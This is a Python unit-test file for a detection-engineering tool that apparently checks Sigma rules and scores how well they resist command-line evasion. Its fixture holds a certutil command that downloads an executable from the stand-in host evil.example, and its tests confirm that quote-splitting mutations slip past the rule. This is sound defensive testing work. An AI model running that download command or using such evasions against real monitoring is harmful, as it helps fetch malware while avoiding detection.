import unittest

from sigma_mutate.matcher import matches
from sigma_mutate.mutators import generate
from sigma_mutate.scoring import BaselineError, score_rule

RULE = {
    "title": "Certutil Download With URLCache",
    "detection": {
        "selection": {
            "Image|endswith": r"\certutil.exe",
            "CommandLine|contains|all": ["-urlcache", "http"],
        },
        "condition": "selection",
    },
}
EVENT = {
    "Image": r"C:\Windows\System32\certutil.exe",
    "CommandLine": "certutil.exe -urlcache -f http://evil.example/a.exe a.exe",
}


class MatcherTests(unittest.TestCase):
    def test_baseline_matches(self):
        self.assertTrue(matches(RULE, EVENT))

    def test_case_insensitive(self):
        self.assertTrue(matches(RULE, {**EVENT, "CommandLine": EVENT["CommandLine"].upper()}))

    def test_condition_not(self):
        rule = {"detection": {
            "sel": {"CommandLine|contains": "http"},
            "flt": {"CommandLine|contains": "good.example"},
            "condition": "sel and not flt",
        }}
        self.assertTrue(matches(rule, {"CommandLine": "x http://evil.example"}))
        self.assertFalse(matches(rule, {"CommandLine": "x http://good.example"}))

    def test_of_quantifiers(self):
        rule = {"detection": {
            "sel_a": {"CommandLine|contains": "aaa"},
            "sel_b": {"CommandLine|contains": "bbb"},
            "condition": "1 of sel_*",
        }}
        self.assertTrue(matches(rule, {"CommandLine": "xx aaa"}))
        self.assertFalse(matches(rule, {"CommandLine": "xx ccc"}))
        rule["detection"]["condition"] = "all of them"
        self.assertFalse(matches(rule, {"CommandLine": "xx aaa"}))
        self.assertTrue(matches(rule, {"CommandLine": "aaa bbb"}))

    def test_wildcards_and_escapes(self):
        BS = chr(92)  # a single backslash character

        def r(pattern, mod="contains"):
            return {"detection": {"sel": {f"CommandLine|{mod}": pattern}, "condition": "sel"}}

        self.assertTrue(matches(r("a*c"), {"CommandLine": "xx abbbc yy"}))
        self.assertFalse(matches(r("a*c"), {"CommandLine": "xx ab yy"}))
        self.assertTrue(matches(r("a?c"), {"CommandLine": "abc"}))
        self.assertFalse(matches(r("a?c"), {"CommandLine": "ac"}))
        # escaped star is a literal star
        self.assertTrue(matches(r("a" + BS + "*c"), {"CommandLine": "a*c"}))
        self.assertFalse(matches(r("a" + BS + "*c"), {"CommandLine": "abc"}))
        # two backslashes in the rule text mean ONE backslash
        pattern = BS * 2 + "srv" + BS * 2 + "share"
        self.assertTrue(matches(r(pattern), {"CommandLine": "x " + BS + "srv" + BS + "share"}))
        self.assertFalse(matches(r(pattern), {"CommandLine": "x " + BS * 2 + "srv" + BS * 2 + "share"}))
        # a lone backslash followed by an ordinary character stays a backslash
        self.assertTrue(matches(r(BS + "cmd.exe", "endswith"), {"CommandLine": "C:" + BS + "x" + BS + "cmd.exe"}))

    def test_unsupported_modifier_is_explicit(self):
        rule = {"detection": {"sel": {"CommandLine|re": "a.*"}, "condition": "sel"}}
        with self.assertRaises(NotImplementedError):
            matches(rule, {"CommandLine": "abc"})


class ScoringTests(unittest.TestCase):
    def test_known_evasions_found(self):
        report = score_rule(RULE, EVENT)
        evaded = {(r.mutation.mutator, r.mutation.label.split(" ")[1]) for r in report.evasions}
        self.assertIn(("quote_split", "1"), evaded)  # -urlcache
        self.assertIn(("quote_split", "3"), evaded)  # http://...
        self.assertLess(report.score, 1.0)

    def test_baseline_must_match(self):
        with self.assertRaises(BaselineError):
            score_rule(RULE, {**EVENT, "CommandLine": "notepad.exe"})

    def test_default_uses_only_argv_equivalent_mutations(self):
        self.assertTrue(all(m.assumption == "argv" for m in generate(EVENT["CommandLine"])))


if __name__ == "__main__":
    unittest.main()
